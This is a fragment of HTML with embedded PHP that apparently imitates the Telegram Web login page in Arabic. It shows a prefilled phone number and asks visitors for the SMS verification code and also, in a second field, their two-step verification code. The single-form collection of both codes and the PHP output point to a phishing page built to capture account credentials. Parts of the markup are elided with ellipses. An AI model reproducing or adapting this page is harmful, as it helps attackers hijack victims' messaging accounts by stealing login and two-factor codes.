...
echo $code
?></span> <span ng-bind="credentials.phone_number">771139923</span></h3>
        ...
        <div ng-switch="credentials.type._">
          <!---->
          <!---->
          <!----><p ng-switch-default="" class="login_smscode_lead" my-i18n="login_enter_sms_code_label_md">لقدارسلنا رمز التحقق إلى هاتفك اذا لم يصلك الرمز عبر رسالة نصية فقد يكون تم ارساله الى حسابك على تيليجرام<br>يرجى ادخال رمز التحقق في الاسفل كما يجب ادخال رمز التحقق بخطوتين اذا كان مفعل لديك مالم فيتم  ترك الحقل الخاص برمز التحقق بخطوتين فارغاً</p><!---->
        </div>
        ...
        <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">ادخل رمز التحقق</label><!---->
         ...
         <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">ادخل رمز التحقق بخطوتين ان كان مفعلا</label><!---->
          <input autocomplete="off" class="md-input ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" my-focused="" name="phone_code2" type="text" ng-model="credentials.phone_code" required="" maxlength="8" value=" ">
        </div>
      </form><!---->
